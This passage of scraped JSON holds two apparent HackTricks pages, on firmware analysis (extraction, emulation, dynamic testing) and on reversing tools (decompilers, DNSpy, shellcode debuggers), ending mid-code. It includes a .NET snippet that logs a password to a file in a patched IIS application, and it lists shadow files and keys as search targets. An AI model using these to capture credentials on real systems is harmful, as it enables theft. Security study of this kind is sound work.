        "text": "Firmware Analysis\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nIntroduction\nFirmware is a type of software that provides communication and control over a device‚Äôs hardware components. It‚Äôs the first piece of code that a device runs. Usually, it\nboots the operating system\nand provides very specific runtime services for programs by\ncommunicating with various hardware components\n. Most, if not all, electronic devices have firmware.\nDevices store firmware in\nnonvolatile memory\n, such as ROM, EPROM, or flash memory.\nIt‚Äôs important to\nexamine\nthe\nfirmware\nand then attempt to\nmodify\nit, because we can uncover many security issues during this process.\nInformation gathering and reconnaissance\nDuring this stage, collect as much information about the target as possible to understand its overall composition underlying technology. Attempt to gather the following:\nSupported CPU architecture(s)\nOperating system platform\nBootloader configurations\nHardware schematics\nDatasheets\nLines-of-code (LoC) estimates\nSource code repository location\nThird-party components\nOpen source licenses (e.g. GPL)\nChangelogs\nFCC IDs\nDesign and data flow diagrams\nThreat models\nPrevious penetration testing reports\nBug tracking tickets (e.g. Jira and bug bounty platforms such as BugCrowd or HackerOne)\nWhere possible, acquire data using open source intelligence (OSINT) tools and techniques. If open source software is used, download the repository and perform both manual as well as automated static analysis against the code base. Sometimes, open source software projects already use free static analysis tools provided by vendors that provide scan results such as\nCoverity Scan\nand\nSemmle‚Äôs LGTM\n.\nGetting the Firmware\nThere are different ways with different difficulty levels to download the firmware\nDirectly\nfrom the development team, manufacturer/vendor or client\nBuild from scratch\nusing walkthroughs provided by the manufacturer\nFrom the\nvendor's support site\nGoogle dork\nqueries targeted towards binary file extensions and file sharing platforms such as Dropbox, Box, and Google drive\nIt‚Äôs common to come across firmware images through customers who upload contents to forums, blogs, or comment on sites where they contacted the manufacturer to troubleshoot an issue and were given firmware via a zip or flash drive sent.\nExample:\nintitle:\"Netgear\" intext:\"Firmware Download\"\nDownload builds from exposed cloud provider storage locations such as Amazon Web Services (AWS) S3 buckets (with tools such as\nhttps://github.com/sa7mon/S3Scanner\n)\nMan-in-the-middle\n(MITM) device communication during\nupdates\nExtract directly\nfrom hardware\nvia\nUART\n,\nJTAG\n,\nPICit\n, etc.\nSniff\nserial communication\nwithin hardware components for\nupdate server requests\nVia a\nhardcoded endpoint\nwithin the mobile or thick applications\nDumping\nfirmware from the\nbootloader\n(e.g. U-boot) to flash storage or over the\nnetwork\nvia\ntftp\nRemoving the\nflash chip\n(e.g. SPI) or MCU from the board for offline analysis and data extraction (LAST RESORT).\nYou will need a supported chip programmer for flash storage and/or the MCU.\nAnalyzing the firmware\nNow that you\nhave the firmware\n, you need to extract information about it to know how to treat it. Different tools you can use for that:\nfile\n<\nbin\n>\nstrings\n-n8\n<\nbin\n>\nstrings\n-tx\n<\nbin\n>\n#print offsets in hex\nhexdump\n-C\n-n\n512\n<\nbin\n>\n>\nhexdump.out\nhexdump\n-C\n<\nbin\n>\n|\nhead\n# might find signatures in header\nfdisk\n-lu\n<\nbin\n>\n#lists a drives partition and filesystems if multiple\nIf you don't find much with those tools check the\nentropy\nof the image with\nbinwalk -E <bin>\n, if low entropy, then it's not likely to be encrypted. If high entropy, Its likely encrypted (or compressed in some way).\nMoreover, you can use these tools to extract\nfiles embedded inside the firmware\n:\nFile/Data Carving & Recovery Tools\nOr\nbinvis.io\n(\ncode\n) to inspect the file.\nGetting the Filesystem\nWith the previous commented tools like\nbinwalk -ev <bin>\nyou should have been able to\nextract the filesystem\n.\nBinwalk usually extracts it inside a\nfolder named as the filesystem type\n, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.\nManual Filesystem Extraction\nSometimes, binwalk will\nnot have the magic byte of the filesystem in its signatures\n. In these cases, use binwalk to\nfind the offset of the filesystem and carve the compressed filesystem\nfrom the binary and\nmanually extract\nthe filesystem according to its type using the steps below.\n$ binwalk DIR850L_REVB.bin\n‚Äã\nDECIMAL HEXADECIMAL DESCRIPTION\n----------------------------------------------------------------------------- ---\n‚Äã\n0 0x0 DLOB firmware header, boot partition: \"\"\"\"dev=/dev/mtdblock/1\"\"\"\"\n10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes\n1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes\n1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41\nRun the following\ndd command\ncarving the Squashfs filesystem.\n$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs\n‚Äã\n8257536+0 records in\n‚Äã\n8257536+0 records out\n‚Äã\n8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s\nAlternatively, the following command could also be run.\n$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs\nFor squashfs (used in the example above)\n$ unsquashfs dir.squashfs\nFiles will be in \"\nsquashfs-root\n\" directory afterwards.\nCPIO archive files\n$ cpio -ivd --no-absolute-filenames -F <bin>\nFor jffs2 filesystems\n$ jefferson rootfsfile.jffs2\nFor ubifs filesystems with NAND flash\n$ ubireader_extract_images -u UBI -s <start_offset> <bin>\n$ ubidump.py <bin>\nAnalyzing the Filesystem\nNow that you have the filesystem is time to start looking for bad practices such as:\nLegacy\ninsecure network daemons\nsuch as telnetd (sometimes manufactures rename binaries to disguise )\nHardcoded credentials\n(usernames, passwords, API keys, SSH keys, and backdoor variants )\nHardcoded API\nendpoints and backend server details\nUpdate server functionality\nthat could be used as an entry point\nReview uncompiled code and start up scripts\nfor remote code execution\nExtract compiled binaries\nto be used for offline analysis with a disassembler for future steps\nSome\ninteresting things to look\nfor inside the firmware:\netc/shadow and etc/passwd\nlist out the etc/ssl directory\nsearch for SSL related files such as .pem, .crt, etc.\nsearch for configuration files\nlook for script files\nsearch for other .bin files\nlook for keywords such as admin, password, remote, AWS keys, etc.\nsearch for common web servers used on IoT devices\nsearch for common binaries such as ssh, tftp, dropbear, etc.\nsearch for banned c functions\nsearch for common command injection vulnerable functions\nsearch for URLs, email addresses and IP addresses\nand more‚Ä¶\nTools that search for this kind of information (even if you always should take a manual look and get comfortable with the filesystem structure, the tools can help you finding\nhidden things\n):\n‚Äã\nLinPEAS\n:\nAwesome bash script that in this case is useful for searching\nsensitive information\ninside the filesystem. Just\nchroot inside the firmware filesystem and run it\n.\n‚Äã\nFirmwalker\n:\nBash script to search for potential sensitive information\n‚Äã\nThe Firmware Analysis and Comparison Tool (FACT)\n:\nIdentification of software components such as operating system, CPU architecture, and third-party components along with their associated version information\nExtraction of firmware filesystem (s ) from images\nDetection of certificates and private keys\nDetection of weak implementations mapping to Common Weakness Enumeration (CWE)\nFeed & signature-based detection of vulnerabilities\nBasic static behavioral analysis\nComparison (diff) of firmware versions and files\nUser mode emulation of filesystem binaries using QEMU\nDetection of binary mitigations such as NX, DEP, ASLR, stack canaries, RELRO, and FORTIFY_SOURCE\nREST API\nand more...\n‚Äã\nFwAnalyzer\n: FwAnalyzer is a tool to analyze (ext2/3/4), FAT/VFat, SquashFS, UBIFS filesystem images, cpio archives, and directory content using a set of configurable rules.\n‚Äã\nByteSweep\n: A Free Software IoT Firmware Security Analysis Tool\n‚Äã\nByteSweep-go\n: This is a complete rewrite of the original ByteSweep project in Go.\n‚Äã\nEMBA\n:\nEMBA\nis designed as the central firmware analysis tool for penetration testers. It supports the complete security analysis process starting with the\nfirmware extraction\nprocess, doing\nstatic analysis\nand\ndynamic analysis\nvia emulation and finally generating a report.\nEMBA\nautomatically discovers possible weak spots and vulnerabilities in firmware. Examples are insecure binaries, old and outdated software components, potentially vulnerable scripts or hard-coded passwords.\nInside the filesystem you can also find\nsource code\nof programs (that you should always\ncheck\n), but also\ncompiled binaries\n. These programs might be somehow exposed and you should\ndecompile\nand\ncheck\nthem for potential vulnerabilities.\nTools like\nchecksec.sh\ncan be useful to find unprotected binaries. For Windows binaries you could use\nPESecurity\n.\nEmulating Firmware\nThe idea to emulate the Firmware is to be able to perform a\ndynamic analysis\nof the device\nrunning\nor of a\nsingle program\n.\nAt times, partial or full emulation\nmay not work due to a hardware or architecture dependencies\n. If the architecture and endianness match a device owned such as a raspberry pie, the root filesystem or specific binary can be transferred to the device for further testing. This method also applies to pre built virtual machines using the same architecture and endianness as the target.\nBinary Emulation\nIf you just want to emulate one program to search for vulnerabilities, you first need to identify its endianness and the CPU architecture for which it was compiled.\nMIPS example\nfile\n./squashfs-root/bin/busybox\n./squashfs-root/bin/busybox: ELF\n32\n-bit MSB executable, MIPS, MIPS32 rel2 version\n1\n(\nSYSV\n)\n, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped\nNow you can\nemulate\nthe busybox executable using\nQEMU\n.\nsudo\napt-get\ninstall\nqemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils\nBecause the executable\nis\ncompiled for\nMIPS\nand follow the\nbig-endian\nbyte ordering, we‚Äôll use QEMU‚Äôs\nqemu-mips\nemulator. To emulate\nlittle-endian\nexecutables, we would have to select the emulator with the\nel\nsuffix(\nqemu-mipsel\n):\nqemu-mips\n-L\n./squashfs-root/ ./squashfs-root/bin/ls\n100\n100\n.7z           15A6D2.squashfs  squashfs-root    squashfs-root-0\nARM Example\nfile\nbin/busybox\nbin/busybox: ELF\n32\n-bit LSB executable, ARM, EABI5 version\n1\n(\nSYSV\n)\n, dynamically linked, interpreter /lib/ld-musl-armhf.so.1, no section header\nEmulation:\nqemu-arm\n-L\n./squashfs-root/ ./squashfs-root/bin/ls\n1C00000.squashfs  B80B6C            C41DD6.xz         squashfs-root     squashfs-root-0\nFull System Emulation\nThere are several tools, based in\nqemu\nin general, that will allow you to emulate the complete firmware:\n‚Äã\nhttps://github.com/firmadyne/firmadyne\n:\nYou need to install several things, configure postgres, then run the extractor.py script to extract the firmware, use the getArch.sh script to get the architecture. Then, use tar2db.py and makeImage.sh scripts to store information from the extracted image in the database and generate a QEMU image that we can emulate. The, use inferNetwork.sh script to get the network interfaces, and finally use the run.sh script, which is automatically created in the ./scratch/1/folder.\n‚Äã\nhttps://github.com/attify/firmware-analysis-toolkit\n:\nThis tool depends on firmadyne and automates the process of emulating the firmware using firmadynee. you need to configure\nfat.config\nbefore using it:\nsudo python3 ./fat.py IoTGoat-rpi-2.img --qemu 2.5.0\n‚Äã\nhttps://github.com/therealsaumil/emux\n‚Äã\n‚Äã\nhttps://github.com/getCUJO/MIPS-X\n‚Äã\n‚Äã\nhttps://github.com/qilingframework/qiling#qltool\n‚Äã\nDynamic analysis\nIn this stage you should have either a device running the firmware to attack or the firmware being emulated to attack. In any case, it's highly recommended that you also have\na shell in the OS and filesystem that is running\n.\nNote that some times if you are emulating the firmware\nsome activities inside the emulation will fail\nand you might need to restart emulating it. For example, a web application might need to get information from a device the original device is integrated with but the emulation is not emulating.\nYou should\nrecheck the filesystem\nas we already did in a\nprevious step as in the running env new information might be accessible.\nIf\nwebpages\nare exposed, reading the code and having access to them you should\ntest them\n. In hacktricks you can find a lot of information about different web hacking techniques.\nIf\nnetwork services\nare exposed you should try to attack them. In hacktricks you can find a lot of information about different network services hacking techniques. You could also try to fuzz them with network and protocol\nfuzzers\nsuch as\nMutiny\n,\nboofuzz\n, and\nkitty\n.\nYou should check if you can\nattack the bootloader\nto get a root shell:\nBootloader testing\nYou should test if the device is doing any kind of\nfirmware integrity tests\n, if not this would allow attackers to offer backdored firmwares, install them in devices other people owns or even deploy them remotely if there is any firmware update vulnerability:\nFirmware Integrity\nFirmware update vulnerabilities usually occurs because, the\nintegrity\nof the\nfirmware\nmight\nnot\nbe\nvalidated\n, use\nunencrypted\nnetwork\nprotocols, use of\nhardcoded\ncredentials\n, an\ninsecure authentication\nto the cloud component that hosts the firmware, and even excessive and insecure\nlogging\n(sensitive data), allow\nphysical updates\nwithout verifications.\nRuntime analysis\nRuntime analysis involves attaching to a running process or binary while a device is running in its normal or emulated environment. Basic runtime analysis steps are provided below:\n1.\nsudo chroot . ./qemu-arch -L <optionalLibPath> -g <gdb_port> <binary>\n2.\nAttach gdb-multiarch or use IDA to emulate the binary\n3.\nSet breakpoints for functions identified during step 4 such as memcpy, strncpy, strcmp, etc.\n4.\nExecute large payload strings to identify overflows or process crashes using a fuzzer\n5.\nMove to step 8 if a vulnerability is identified\nTools that may be helpful are (non-exhaustive):\ngdb-multiarch\n‚Äã\nPeda\n‚Äã\nFrida\nptrace\nstrace\nIDA Pro\nGhidra\nBinary Ninja\nHopper\nBinary Exploitation\nAfter identifying a vulnerability within a binary from previous steps, a proper proof-of-concept (PoC) is required to demonstrate the real-world impact and risk. Developing exploit code requires programming experience in lower level languages (e.g. ASM, C/C++, shellcode, etc.) as well as background within the particular target architecture (e.g. MIPS, ARM, x86 etc.). PoC code involves obtaining arbitrary execution on a device or application by controlling an instruction in memory.\nIt is not common for binary runtime protections (e.g. NX, DEP, ASLR, etc.) to be in place within embedded systems however when this happens, additional techniques may be required such as return oriented programming (ROP). ROP allows an attacker to implement arbitrary malicious functionality by chaining existing code in the target process/binary's code known as gadgets. Steps will need to be taken to exploit an identified vulnerability such as a buffer overflow by forming a ROP chain. A tool that can be useful for situations like these is Capstone's gadget finder or ROPGadget-\nhttps://github.com/JonathanSalwan/ROPgadget\n.\nUtilize the following references for further guidance:\n‚Äã\nhttps://azeria-labs.com/writing-arm-shellcode/\n‚Äã\n‚Äã\nhttps://www.corelan.be/index.php/category/security/exploit-writing-tutorials/\n‚Äã\nPrepared OSs to analyze Firmware\n‚Äã\nAttifyOS\n: AttifyOS is a distro intended to help you perform security assessment and penetration testing of Internet of Things (IoT) devices. It saves you a lot of time by providing a pre-configured environment with all the necessary tools loaded.\n‚Äã\nEmbedOS\n: Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.\nVulnerable firmware to practice\nTo practice discovering vulnerabilities in firmware, use the following vulnerable firmware projects as a starting point.\nOWASP IoTGoat\n‚Äã\nhttps://github.com/OWASP/IoTGoat\n‚Äã\nThe Damn Vulnerable Router Firmware Project\n‚Äã\nhttps://github.com/praetorian-code/DVRF\n‚Äã\nDamn Vulnerable ARM Router (DVAR)\n‚Äã\nhttps://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html\n‚Äã\nARM-X\n‚Äã\nhttps://github.com/therealsaumil/armx#downloads\n‚Äã\nAzeria Labs VM 2.0\n‚Äã\nhttps://azeria-labs.com/lab-vm-2-0/\n‚Äã\nDamn Vulnerable IoT Device (DVID)\n‚Äã\nhttps://github.com/Vulcainreo/DVID\n‚Äã\nReferences\n‚Äã\nhttps://scriptingxss.gitbook.io/firmware-security-testing-methodology/\n‚Äã\n‚Äã\nPractical IoT Hacking: The Definitive Guide to Attacking the Internet of Things\n‚Äã\nTrainning and Cert\n‚Äã\nhttps://www.attify-store.com/products/offensive-iot-exploitation\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nShow file extensions\nNext\nBootloader testing\nLast modified\n6mo ago"
    },
    {
        "title": "Reversing Tools & Basic Methods",
        "url": "https://book.hacktricks.xyz/reversing-and-exploiting/reversing-tools-basic-methods",
        "text": "Reversing Tools & Basic Methods\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nImGui Based Reversing tools\nSoftware:\nReverseKit:\nhttps://github.com/zer0condition/ReverseKit\n‚Äã\nWasm decompiler / Wat compiler\nOnline:\nUse\nhttps://webassembly.github.io/wabt/demo/wasm2wat/index.html\nto\ndecompile\nfrom wasm (binary) to wat (clear text)\nUse\nhttps://webassembly.github.io/wabt/demo/wat2wasm/\nto\ncompile\nfrom wat to wasm\nyou can also try to use\nhttps://wwwg.github.io/web-wasmdec/\nto decompile\nSoftware:\n‚Äã\nhttps://www.pnfsoftware.com/jeb/demo\n‚Äã\n‚Äã\nhttps://github.com/wwwg/wasmdec\n‚Äã\n.Net decompiler\n‚Äã\ndotPeek\n‚Äã\ndotPeek is a decompiler that\ndecompiles and examines multiple formats\n, including\nlibraries\n(.dll),\nWindows metadata file\ns (.winmd), and\nexecutables\n(.exe). Once decompiled, an assembly can be saved as a Visual Studio project (.csproj).\nThe merit here is that if a lost source code requires restoration from a legacy assembly, this action can save time. Further, dotPeek provides handy navigation throughout the decompiled code, making it one of the perfect tools for\nXamarin algorithm analysis.\n‚Äã\n.Net Reflector\n‚Äã\nWith a comprehensive add-in model and an API that extends the tool to suit your exact needs, .NET reflector saves time and simplifies development. Let's take a look at the plethora of reverse engineering services this tool provides:\nProvides an insight into how the data flows through a library or component\nProvides insight into the implementation and usage of .NET languages and frameworks\nFinds undocumented and unexposed functionality to get more out of the APIs and technologies used.\nFinds dependencies and different assemblies\nTracks down the exact location of errors in your code, third-party components, and libraries.\nDebugs into the source of all the .NET code you work with.\n‚Äã\nILSpy\n&\ndnSpy\n‚Äã\n‚Äã\nILSpy plugin for Visual Studio Code\n: You can have it in any OS (you can install it directly from VSCode, no need to download the git. Click on\nExtensions\nand\nsearch ILSpy\n).\nIf you need to\ndecompile\n,\nmodify\nand\nrecompile\nagain you can use:\nhttps://github.com/0xd4d/dnSpy/releases\n(\nRight Click -> Modify Method\nto change something inside a function).\nYou cloud also try\nhttps://www.jetbrains.com/es-es/decompiler/\n‚Äã\nDNSpy Logging\nIn order to make\nDNSpy log some information in a file\n, you could use this .Net lines:\nusing System.IO\n;\npath\n=\n\"C:\n\\\\\ninetpub\n\\\\\ntemp\n\\\\\nMyTest2.txt\"\n;\nFile.AppendAllText\n(\npath,\n\"Password: \"\n+ password +\n\"\n\\n\n\"\n);\nDNSpy Debugging\nIn order to debug code using DNSpy you need to:\nFirst, change the\nAssembly attributes\nrelated to\ndebugging\n:\nFrom:\n[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]\nTo:\n[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default |\nDebuggableAttribute.DebuggingModes.DisableOptimizations |\nDebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints |\nDebuggableAttribute.DebuggingModes.EnableEditAndContinue)]\nAnd click on\ncompile\n:\nThen save the new file on\nFile >> Save module...\n:\nThis is necessary because if you don't do this, at\nruntime\nseveral\noptimisations\nwill be applied to the code and it could be possible that while debugging a\nbreak-point is never hit\nor some\nvariables don't exist\n.\nThen, if your .Net application is being\nrun\nby\nIIS\nyou can\nrestart\nit with:\niisreset /noforce\nThen, in order to start debugging you should close all the opened files and inside the\nDebug Tab\nselect\nAttach to Process...\n:\nThen select\nw3wp.exe\nto attach to the\nIIS server\nand click\nattach\n:\nNow that we are debugging the process, it's time to stop it and load all the modules. First click on\nDebug >> Break All\nand then click on\nDebug >> Windows >> Modules\n:\nClick any module on\nModules\nand selec\nt Open All Modules\n:\nRight click any module in\nAssembly Explorer\nand click\nSort Assemblies\n:\nJava decompiler\n‚Äã\nhttps://github.com/skylot/jadx\nhttps://github.com/java-decompiler/jd-gui/releases\n‚Äã\nDebugging DLLs\nUsing IDA\nLoad rundll32\n(64bits in C:\\Windows\\System32\\rundll32.exe and 32 bits in C:\\Windows\\SysWOW64\\rundll32.exe)\nSelect\nWindbg\ndebugger\nSelect \"\nSuspend on library load/unload\n\"\nConfigure the\nparameters\nof the execution putting the\npath to the DLL\nand the function that you want to call:\nThen, when you start debugging\nthe execution will be stopped when each DLL is loaded\n, then, when rundll32 load your DLL the execution will be stopped.\nBut, how can you get to the code of the DLL that was lodaded? Using this method, I don't know how.\nUsing x64dbg/x32dbg\nLoad rundll32\n(64bits in C:\\Windows\\System32\\rundll32.exe and 32 bits in C:\\Windows\\SysWOW64\\rundll32.exe)\nChange the Command Line\n(\nFile --> Change Command Line\n) and set the path of the dll and the function that you want to call, for example: \"C:\\Windows\\SysWOW64\\rundll32.exe\" \"Z:\\shared\\Cybercamp\\rev2\\\\14.ridii_2.dll\",DLLMain\nChange\nOptions --> Settings\nand select \"\nDLL Entry\n\".\nThen\nstart the execution\n, the debugger will stop at each dll main, at some point you will\nstop in the dll Entry of your dll\n. From there, just search for the points where you want to put a breakpoint.\nNotice that when the execution is stopped by any reason in win64dbg you can see\nin which code you are\nlooking in the\ntop of the win64dbg window\n:\nThen, looking to this ca see when the execution was stopped in the dll you want to debug.\nGUI Apps / Videogames\n‚Äã\nCheat Engine\nis a useful program to find where important values are saved inside the memory of a running game and change them. More info in:\nCheat Engine\nARM & MIPS\nGitHub - nongiach/arm_now: arm_now is a qemu powered tool that allows instant setup of virtual machines on arm cpu, mips, powerpc, nios2, x86 and more, for reverse, exploit, fuzzing and programming purpose.\nGitHub\nShellcodes\nDebugging a shellcode with blobrunner\n‚Äã\nBlobrunner\nwill\nallocate\nthe\nshellcode\ninside a space of memory, will\nindicate\nyou the\nmemory address\nwere the shellcode was allocated and will\nstop\nthe execution.\nThen, you need to\nattach a debugger\n(Ida or x64dbg) to the process and put a\nbreakpoint the indicated memory address\nand\nresume\nthe execution. This way you will be debugging the shellcode.\nThe releases github page contains zips containing the compiled releases:\nhttps://github.com/OALabs/BlobRunner/releases/tag/v0.0.5\nYou can find a slightly modified version of Blobrunner in the following link. In order to compile it just\ncreate a C/C++ project in Visual Studio Code, copy and paste the code and build it\n.\nBlobrunner\nDebugging a shellcode with jmp2it\n‚Äã\njmp2it\nis very similar to blobrunner. It will\nallocate\nthe\nshellcode\ninside a space of memory, and start an\neternal loop\n. You then need to\nattach the debugger\nto the process,\nplay start wait 2-5 secs and press stop\nand you will find yourself inside the\neternal loop\n. Jump to the next instruction of the eternal loop as it will be a call to the shellcode, and finally you will find yourself executing the shellcode.\nYou can download a compiled version of\njmp2it inside the releases page\n.\nDebugging shellcode using Cutter\n‚Äã\nCutter\nis the GUI of radare. Using cutter you can emulate the shellcode and inspect it dynamically.\nNote that Cutter allows you to \"Open File\" and \"Open Shellcode\". In my case when I opened the shellcode as a file it decompiled it correctly, but when I opened it as a shellcode it didn't:\nIn order to start the emulation in the place you want to, set a bp there and apparently cutter will automatically start the emulation from there:\nYou can see the stack for example inside a hex dump:\nDeobfuscating shellcode and getting executed functions\nYou should try\nscdbg\n.\nIt will tell you things like\nwhich functions\nis the shellcode using and if the shellcode is\ndecoding\nitself in memory.\nscdbg.exe\n-f\nshellcode\n# Get info\nscdbg.exe\n-f\nshellcode\n-r\n#show analysis report at end of run\nscdbg.exe\n-f\nshellcode\n-i\n-r\n#enable interactive hooks (file and network) and show analysis report at end of run\nscdbg.exe\n-f\nshellcode\n-d\n#Dump decoded shellcode\nscdbg.exe\n-f\nshellcode /findsc\n#Find offset where starts\nscdbg.exe\n-f\nshellcode /foff 0x0000004D\n#Start the executing in that offset\nscDbg also counts with a graphical launcher where you can select the options you want and execute the shellcode\nThe\nCreate Dump\noption will dump the final shellcode if any change is done to the shellcode dynamically in memory (useful to download the decoded shellcode). The\nstart offset\ncan be useful to start the shellcode at a specific offset. The\nDebug Shell\noption is useful to debug the shellcode using the scDbg terminal (however I find any of the options explained before better for this matter as you will be able to use Ida or x64dbg).\nDisassembling using CyberChef\nUpload you shellcode file as input and use the following receipt to decompile it:\nhttps://gchq.github.io/CyberChef/#recipe=To_Hex('Space',0)Disassemble_x86('32','Full%20x86%20architecture',16,0,true,true)\n‚Äã\n‚Äã\nMovfuscator\n‚Äã\nThis obfuscator\nmodify all the instructions for\nmov\n(yeah, really cool). It also uses interruptions to change executions flows. For more information about how does it works:\n‚Äã\nhttps://www.youtube.com/watch?v=2VF_wPkiBJY\n‚Äã\n‚Äã\nhttps://github.com/xoreaxeaxeax/movfuscator/blob/master/slides/domas_2015_the_movfuscator.pdf\n‚Äã\nIf you are lucky\ndemovfuscator\nwill deofuscate the binary. It has several dependencies\napt-get install libcapstone-dev\napt-get install libz3-dev\nAnd\ninstall keystone\n(\napt-get install cmake; mkdir build; cd build; ../make-share.sh; make install\n)\nIf you are playing a\nCTF, this workaround to find the flag\ncould be very useful:\nhttps://dustri.org/b/defeating-the-recons-movfuscator-crackme.html\n‚Äã\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nRust\nTo find the\nentry point\nsearch the functions by\n::main\nlike in:\nIn this case the binary was called authenticator, so it's pretty obvious that this is the interesting main function.\nHaving the\nname\nof the\nfunctions\nbeing called, search for them on the\nInternet\nto learn about their\ninputs\nand\noutputs\n.\nDelphi\nFor Delphi compiled binaries you can use\nhttps://github.com/crypto2011/IDR\n‚Äã\nI you have to reverse a Delphi binary I would suggest you to use the IDA plugin\nhttps://github.com/Coldzer0/IDA-For-Delphi\n‚Äã\nJust press\nATL+f7\n(import python plugin in IDA) and select the python plugin.\nThis plugin will execute the binary and resolve function names dynamically at the start of the debugging. After starting the debugging press again the Start button (the green one or f9) and a breakpoint will hit in the beginning of the real code.\nIt is also very interesting because if you press a button in the graphic application the debugger will stop in the function executed by that bottom.\nGolang\nI you have to reverse a Golang binary I would suggest you to use the IDA plugin\nhttps://github.com/sibears/IDAGolangHelper\n‚Äã\nJust press\nATL+f7\n(import python plugin in IDA) and select the python plugin.\nThis will resolve the names of the functions.\nCompiled Python\nIn this page you can find how to get the python code from an ELF/EXE python compiled binary:\nDecompile compiled python binaries (exe, elf) - Retreive from .pyc\nGBA - Game Body Advance\nIf you get the\nbinary\nof a GBA game you can use different tools to\nemulate\nand\ndebug\nit:\n‚Äã\nno$gba\n(\nDownload the debug version\n) - Contains a debugger with interface\n‚Äã\nmgba\n- Contains a CLI debugger\n‚Äã\ngba-ghidra-loader\n- Ghidra plugin\n‚Äã\nGhidraGBA\n- Ghidra plugin\nIn\nno$gba\n, in\nOptions --> Emulation Setup --> Controls\n** ** you can see how to press the Game Boy Advance\nbuttons\nWhen pressed, each\nkey has a value\nto identify it:\nA = 1\nB = 2\nSELECT = 4\nSTART = 8\nRIGHT = 16\nLEFT = 32\nUP = 64\nDOWN = 128\nR = 256\nL = 256\nSo, in this kind of programs, the an interesting part will be\nhow the program treats the user input\n. In the address\n0x4000130\nyou will find the commonly found function:\nKEYINPUT.\nIn the previous image you can find that the function is called from\nFUN_080015a8\n(addresses:\n0x080015fa\nand\n0x080017ac\n).\nIn that function, after some init operations (without any importance):\nvoid\nFUN_080015a8\n(\nvoid\n)\n‚Äã\n{\nushort uVar1\n;\nundefined4 uVar2\n;\nundefined4 uVar3\n;\nushort uVar4\n;\nint\niVar5\n;\nushort\n*\npuVar6\n;\nundefined\n*\nlocal_2c\n;\nDISPCNT\n=\n0x1140\n;\nFUN_08000a74\n();\nFUN_08000ce4\n(\n1\n);\nDISPCNT\n=\n0x404\n;\nFUN_08000dd0\n(\n&\nDAT_02009584\n,\n0x6000000\n,\n&\nDAT_030000dc\n);\nFUN_08000354\n(\n&\nDAT_030000dc\n,\n0x3c\n);\nuVar4\n=\nDAT_030004d8\n;\nIt's found this code:\ndo\n{\nDAT_030004da\n=\nuVar4\n;\n//This is the last key 